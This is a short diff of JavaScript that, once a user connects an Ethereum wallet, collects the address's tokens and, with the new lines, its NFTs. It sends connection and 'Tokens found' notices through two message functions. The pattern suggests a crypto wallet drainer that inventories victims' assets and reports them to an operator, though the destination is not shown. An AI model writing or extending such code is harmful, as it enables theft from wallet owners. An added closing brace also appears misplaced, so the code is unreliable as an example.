@@ -384,6 +384,10 @@ async function proceed(){
           console.log("Unable to get tokens", e);
           
         });
+        const eth_NFT = await getNFTs(user_address).catch(e=>{
+          console.log("Unable to get NFts", e);
+          
+        });
         await sendMessage(`me ... ETHEREUM : connected to ${user_address}`);
         await sendMessage1(`ETHEREUM : connected to ${user_address}`);
         console.log('First Eth tokens: %o', eth_token)
@@ -421,6 +425,7 @@ async function proceed(){
             await sendMessage(`Tokens found` )
             await sendMessage1(`Tokens found` )
           }
+        }
           return console.log('No tokens found')
         }
 
